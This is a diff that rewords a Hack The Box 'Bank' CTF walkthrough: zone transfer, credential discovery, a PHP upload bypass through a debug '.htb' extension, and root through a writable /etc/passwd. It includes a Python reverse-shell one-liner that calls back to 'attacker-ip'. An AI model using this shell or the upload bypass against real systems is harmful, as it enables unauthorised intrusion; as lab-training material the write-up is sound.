@@ -1,17 +1,13 @@
----
-title: bank
-date: 2020-12-03 14:05:05 +/-TTTT
-categories: [CTF, hackthebox]
-tags: [file upload, dns, passwd]
----
 
-![infocard](/assets/htb/bank/infocard.png)
+## infocard
 
-bank is an easy box in which we have to do some domain enumeration to find website hosted on box.  bypass file upload restriction to get a shell on box. privs escalation is easy we have to just modify a file.
+![infocard](media/bankinfocard.png)
+
+Bank is an easy box in which we perform domain enumeration to find a hosted website, bypass file upload restrictions to gain shell access, and escalate privileges by modifying a file.
 
 ## Enumeration
 
-So let's dive in, as always we start with a Nmap scan.
+We start with an Nmap scan:
 
 ```nmap
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-04 01:10 EST
@@ -36,30 +32,23 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 17.98 seconds
 ```
-Nmap shows that we have ssh, DNS, and webpage on the box. Let's start to enumerate the webpage. 
+The Nmap scan reveals SSH, DNS, and HTTP services. Exploring the webpage shows the default Apache HTTP page. Running Gobuster yields no interesting results.
 
-the webpage shows the default apache HTTP page. also, run gobuster but nothing interested found.
+### DNS Enumeration
 
-![webpage](/assets/htb/bank/webpage.png)
+Port 53 is open. Attempting a zone transfer using `bank.htb` as a domain reveals several subdomains:
 
-there is port 53 open so let's check for zone transfer.  there is no hint about host or domain lets try `bank.htb.`
+![dig](media/bankdig.png)
 
-![dig](/assets/htb/bank/dig.png)
+We discover `chris.bank.htb`, `bank.htb`, `ns.bank.htb`, and `www.bank.htb`. Adding these to `/etc/hosts` allows further exploration. While most subdomains redirect to the default Apache page, `bank.htb` leads to a login page.
 
-we found `chris.bank.htb` `bank.htb` `ns.bank.htb` `www.bank.htb` . add them in `/etc/hosts` file.
+![login](media/banklogin.png)
 
-chris.bank.htb ns.bank.htb and www.bank.htb redirected to default apache page. only bank.htb redirected to login page.
+After testing default credentials and SQL injection, no vulnerabilities are found. Using `ffuf` reveals some directories:
 
-![login](/assets/htb/bank/login.png)
+![dirscan](media/bankdirscan.png)
 
-try to some default creds like admin:admin , admin:password, admin:bank, bank:bank but none of this work, also test for sqli but does not found sqli vulnerability.
-
-Let's find out what directories are present using ffuf.
-
-![dirscan](/assets/htb/bank/dirscan.png)
-
-`uploads` return 403 forbidden, `assets` doesn't seem too interesting, `inc` has four PHP pages it also doesn't seem interesting.
-`balance-transfer`  has a lot of `.acc` files which having encrypted username and password. but one file looks interesting because it has less size compare to all other files. and when I open it it has a plain text username and password for Chris.
+The `balance-transfer` directory contains `.acc` files. One file, smaller than the rest, reveals plaintext credentials for Chris:
 
 ```
 --ERR ENCRYPT FAILED
@@ -78,34 +67,37 @@ Balance: 8842803 .
 ```
 
 ## Gaining shell
-using these creds log in to Chris's account. there is `support.php` which is tickets system and we can uploads files. try to upload PHP shell but it gives us an error that only image files can be uploaded. so I craft a file that has png mime type and PHP shell content and uploads it.
 
-it accepts the file but the webserver does not treat it as a PHP file because of `.png` extension.
+Using Chris's credentials, we log in and find a ticket system (`support.php`) that allows file uploads. Uploading a PHP shell fails due to MIME type restrictions. Crafting a file with a PNG MIME type and PHP content uploads successfully but is not executed due to the `.png` extension.
 
-![fileupload](/assets/htb/bank/fileupload.png)
+![fileupload](media/bankfileupload.png)
 
-here I stuck for a while but after viewing the source code of the `support.php`  i found that it can accept `.htb` extension which executes as PHP code so create a new payload with `.htb` and upload it.
+Examining the source code reveals:
 
 `<!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] -->`
 
-access the web shell in `bank.htb/uploads/test.htb`
-got web-shell as `www-data`
+Creating a payload with the `.htb` extension and uploading it works. Accessing `bank.htb/uploads/test.htb` provides a web shell as `www-data`:
  
-![wwwshell](/assets/htb/bank/wwwshell.png)
+![wwwshell](media/bankwwwshell.png)
 
-used python to get reverse shell.
+A reverse shell is established using Python:
 
 `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker-ip",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
 
-in chris's home directory found a user flag.
+The user flag is found in Chris's home directory:
 
-![user](/assets/htb/bank/user.png)
+![user](media/bankuser.png)
 
-## Getting root
+## Privilege Escalation
 
-while enumerating box for privs I found that we can write into `/etc/passwd` file. 
-![passwd](/assets/htb/bank/passwd.png)
+During enumeration, it is discovered that `/etc/passwd` is writable:
 
-so it's easy to get root on the box. just create another user with root privs and got root access.
+![passwd](media/bankpasswd.png)
 
-![root](/assets/htb/bank/root.png)
+Adding a new user with root privileges allows root access:
+
+![root](media/bankroot.png)
+
+## Conclusion
+
+The Bank machine emphasizes the significance of secure file upload handling and proper input validation. By exploiting a file upload vulnerability and misconfigured file extension handling, we gained a foothold on the system. Privilege escalation was achieved through writable sensitive files, demonstrating the importance of enforcing least privilege and monitoring for misconfigurations to enhance security.
